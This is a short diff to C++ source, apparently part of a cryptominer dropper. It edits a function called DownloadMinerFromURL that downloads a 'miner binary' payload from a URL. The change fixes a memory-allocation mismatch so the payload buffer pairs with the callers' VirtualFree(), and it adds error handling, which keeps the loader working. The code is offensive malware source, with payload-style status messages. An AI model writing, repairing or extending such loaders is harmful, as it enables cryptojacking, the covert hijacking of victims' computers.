@@ -7,6 +7,7 @@
 #include <vector>
 #include <stdexcept>
 #include <iostream>
+#include "util.h"       // allocate_buffer()
 
 // Download a file from a URL and return as byte array
 bool DownloadMinerFromURL(const std::wstring& urlStr, BYTE*& payloadBuf, size_t& payloadSize) {
@@ -121,10 +122,16 @@ bool DownloadMinerFromURL(const std::wstring& urlStr, BYTE*& payloadBuf, size_t&
         return false;
     }
     
-    // Copy to output buffer
+    // Copy to output buffer. Must pair with free_buffer()/VirtualFree(), which
+    // the callers use - a new[] here leaked the entire miner binary.
+    payloadBuf = allocate_buffer(buffer.size());
+    if (!payloadBuf) {
+        std::cerr << "[-] Failed to allocate " << buffer.size() << " bytes for payload" << std::endl;
+        payloadSize = 0;
+        return false;
+    }
+    memcpy(payloadBuf, buffer.data(), buffer.size());
     payloadSize = buffer.size();
-    payloadBuf = new BYTE[payloadSize];
-    memcpy(payloadBuf, buffer.data(), payloadSize);
     
     std::wcout << L"[+] Downloaded " << payloadSize << L" bytes from " << urlStr << std::endl;
     return true;
